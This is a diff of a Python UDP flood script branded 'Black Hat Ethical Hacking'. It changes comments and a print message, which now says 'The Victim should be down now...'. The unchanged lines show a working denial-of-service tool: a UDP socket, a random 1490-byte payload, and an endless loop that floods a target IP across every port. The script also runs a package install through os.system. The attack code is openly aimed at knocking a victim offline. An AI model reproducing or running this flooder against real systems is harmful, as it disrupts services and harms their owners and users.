@@ -3,7 +3,7 @@ import os
 import time
 import socket
 import random
-#Code Time
+#This is where the magic starts using the power of python
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -16,7 +16,7 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
-
+#Install Figlet
 os.system("clear")
 os.system("apt-get install -y figlet")
 os.system("figlet Black Hat Ethical Hacking")
@@ -53,6 +53,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Sent %s packet to %s throught port:%s - The Victim should be down now..."%(sent,ip,port)
      if port == 65534:
        port = 1
